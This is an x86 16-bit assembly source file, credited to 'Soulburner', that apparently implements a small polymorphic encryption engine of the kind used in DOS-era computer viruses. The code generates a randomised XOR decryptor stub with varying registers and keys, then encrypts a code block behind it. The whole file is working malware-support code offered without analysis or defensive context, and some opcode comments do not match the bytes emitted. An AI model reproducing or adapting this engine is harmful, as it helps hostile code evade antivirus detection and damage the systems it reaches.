   ; Simple crypting routine by Soulburner

   ; Cs:Si - Code
   ; Cs:Di - where
   ; Dx - offset , Cx - length to be crypted...

   Dlen    = 22

   xmm proc
       push di
       push si cx
                       ; Setup registers
       mov ax,3
       call getrnd

       mov [xorpt],ax

   xmm_bad:
       mov ax,8
       call getrnd

       lea si,[Ut]
       add si,[xorpt]
       cmp al,byte ptr [si]
       jz xmm_bad
       cmp al,4
       jz xmm_bad
       mov [cntp],al           ; Choosed counter

       mov al,9CH          ; pushf
       stosb

       mov ax,9593h            ; xchg ax,bx
       stosw
       mov ax,0EB87h           ; xchg ax,bp
       stosw
       mov al,95h          ; xchg bx,bp
       stosb

       mov al,60h          ; xchg ax,bp
       stosb

       mov al,0B8h         ; Mov ax,xxxx
       add al,[cntp]           ; Change Mov Ax,xxxx to counter
       stosb               ; register (for example Mov Cx,xxxx)

       mov ax,cx
       stosw

       mov al,0BBh         ; Mov bx,xxxx

       lea si,[addt1]          ; Change it to xor'ing register
       add si,[xorpt]
       add al,byte ptr [si]

       stosb
       mov ax,dx
       add ax,Dlen
       stosw

       mov al,80h          ; xor [reg],imm8
       stosb

       lea si,[Addt2]
       add si,[xorpt]
       mov al,37h
       add al,byte ptr [Si]

       stosb

       xor ax,ax
       dec ax
       call getrnd

       mov [cval],al

       stosb

       mov al,43h          ; Inc Pointer

       lea si,[Addt1]
       add si,[xorpt]
       add al,byte ptr [si]

       stosb

       mov al,48h          ; Dec Counter
       add al,[Cntp]

       stosb

       mov al,0Bh          ; or Counter,Counter
       stosb

       xor ax,ax
       mov al,[Cntp]
       shl al,3
       add al,0C0h
       add al,[Cntp]

       stosb

       mov ax,0F775h           ; Jne Back
       stosw

       pop cx si

       mov ah,[Cval]
       push cx
   Crypt:                  ; Crypt source
       lodsb
       xor al,ah
       stosb
       loop Crypt
       pop cx
       add cx,Dlen

       pop di

       ret
   xmm endp

   cntp    db  ?
   xorpt   dw  ?
   cval    db  ?

   ut  db  3
       db  6
       db  7

   addt1   db  0
       db  3
       db  4

   addt2   db  0
       db  -3
       db  -2
